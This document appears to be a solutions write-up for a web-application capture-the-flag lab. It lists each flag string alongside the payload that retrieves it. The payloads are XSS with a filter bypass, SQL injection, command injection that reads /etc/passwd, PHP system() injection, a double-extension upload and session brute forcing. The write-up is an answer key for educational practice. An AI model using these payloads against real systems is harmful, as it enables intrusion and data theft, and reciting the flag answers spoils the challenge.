```markdown
# Web Application CTF Challenge: Flag Solutions and Methods

## Cross-Site Scripting (XSS) Flags

### Flag 1: `f76sdfkg6sjf`
- **Location**: Welcome.php
- **Vulnerability**: XSS Reflected
- **Method**:
  ```html
  <script>alert("hi")</script>
  ```

### Flag 2: `ksdnd99dkas`
- **Location**: Memory-Planner.php (first field)
- **Vulnerability**: XSS Reflected (Advanced)
- **Method**: 
  ```html
  <SCRIPscriptT>alert("hi")</SCRIPscripTt>
  ```
- **Note**: Input validation removes "script", so split the word

### Flag 3: `sd7fk1nctx`
- **Location**: comments.php
- **Vulnerability**: XSS Stored
- **Method**:
  ```html
  <script>alert("hi")</script>
  ```

## File Inclusion and Data Exposure Flags

### Flag 4: `nckd97dk6sh2`
- **Location**: About-Rekall.php
- **Vulnerability**: Sensitive Data Exposure
- **Method**:
  ```bash
  # Using cURL
  curl -v http://192.168.14.35/About-Rekall.php

  # OR using Burp Suite
  1. Set up Burp/FoxyProxy
  2. Visit page
  3. Send to Repeater
  4. Check response headers
  ```

### Flag 5: `mmssdi73g`
- **Location**: Memory-Planner.php (second field)
- **Vulnerability**: Local File Inclusion
- **Method**:
  ```php
  // Create test.php
  <?php
    echo "Hi!";
  ?>
  ```
- **Steps**: Upload to "Choose your Adventure" option

### Flag 6: `ld8skd62hdd`
- **Location**: Memory-Planner.php (third field)
- **Vulnerability**: Local File Inclusion (Advanced)
- **Method**: Create and upload `test.jpg.php`
- **Note**: Bypasses .jpg extension check

## Authentication and Injection Flags

### Flag 7: `bcs92sjsk233`
- **Location**: Login.php (first field)
- **Vulnerability**: SQL Injection
- **Method**:
  ```sql
  ' or 1=1 -- -
  ```

### Flag 8: `87fsdkf6djf`
- **Location**: Login.php (second field)
- **Vulnerability**: Sensitive Data Exposure
- **Credentials**:
  - Username: `dougquaid`
  - Password: `kuato`
- **Method**: Highlight page to reveal hidden HTML

### Flag 9: `dkkdudfkdy23`
- **Location**: robots.txt
- **Vulnerability**: Sensitive Data Exposure
- **Method**: Access `http://192.168.14.35/robots.txt`

## Command Injection Flags

### Flag 10: `dkkdudfkdy23`
- **Location**: DNS Check
- **Vulnerability**: Command Injection
- **Method**:
  ```bash
  127.0.0.1 && cat vendors.txt
  127.0.0.1 && cat ../../../../etc/passwd
  ```

### Flag 11: `ksdnd99dkas`
- **Location**: MX Record Checker
- **Vulnerability**: Command Injection (Advanced)
- **Method**:
  ```bash
  www.example.com | cat vendors.txt
  ```
- **Note**: `&` and `;` are stripped, use `|` instead

## Advanced Exploitation Flags

### Flag 12: `hsk23oncsd`
- **Location**: Admin Login
- **Vulnerability**: Weak Credentials
- **Credentials**:
  - Username: `melina`
  - Password: `melina`
- **Note**: User found in `/etc/passwd`

### Flag 13: `jdka7sk23dd`
- **Location**: souvenirs.php
- **Vulnerability**: PHP Injection
- **Method**:
  ```url
  http://192.168.13.35/souvenirs.php?message=""; system('cat /etc/passwd')
  ```

### Flag 14: `dks93jdlsd7dj`
- **Location**: admin_legal_data.php
- **Vulnerability**: Session Management
- **Method**:
  ```url
  http://192.168.13.35/admin_legal_data.php?admin=87
  ```
- **Note**: Use Burp Intruder to find correct session ID (87)

### Flag 15: `dksdf7sjd5sg`
- **Location**: Disclaimer.php
- **Vulnerability**: Directory Traversal
- **Method**:
  ```bash
  # First, enumerate directories
  www.example.com && ls -la old_disclaimers
  
  # Then access file
  http://192.168.13.35/disclaimer.php?page=old_disclaimers/disclaimer_1.txt
  ```

## Summary of Vulnerabilities
1. Cross-Site Scripting (XSS)
   - Reflected
   - Stored
2. File Inclusion
3. Command Injection
4. SQL Injection
5. Session Management
6. Directory Traversal
7. PHP Injection

## Tools Used
- Burp Suite/FoxyProxy
- cURL
- Web Browser Developer Tools
``````